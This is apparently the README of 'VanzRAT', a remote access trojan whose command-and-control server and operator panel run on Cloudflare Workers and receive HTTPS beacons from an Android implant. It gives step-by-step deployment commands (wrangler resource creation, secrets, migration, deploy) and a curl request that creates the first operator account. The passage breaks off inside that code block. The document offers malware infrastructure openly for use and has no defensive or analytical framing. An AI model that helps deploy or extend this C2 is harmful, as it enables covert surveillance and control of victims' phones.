# VanzRAT — Edge C2

Web-based C2 built on Cloudflare Workers. Android implant beacons via HTTPS,
operator panel served from same edge.

## Deploy

1. `npm install -g wrangler`
2. `wrangler login`
3. Create resources:
   - `wrangler d1 create vanzrat` → copy `database_id` to `wrangler.toml`
   - `wrangler kv namespace create KV` → copy `id`
   - `wrangler r2 bucket create vanzrat`
4. Set secrets:
   - `wrangler secret put JWT_SECRET`
   - `wrangler secret put PASS_SALT`
5. Apply migration:
   - `wrangler d1 migrations apply vanzrat --remote`
6. Deploy:
   - `wrangler deploy`
7. Create first operator:
   ```bash
   curl -X POST https://vanzrat.<sub>.workers.dev/setup \
     -H 'content-type: application/json' \
     -d '{"username":"vanz","password":"<strong>"}'
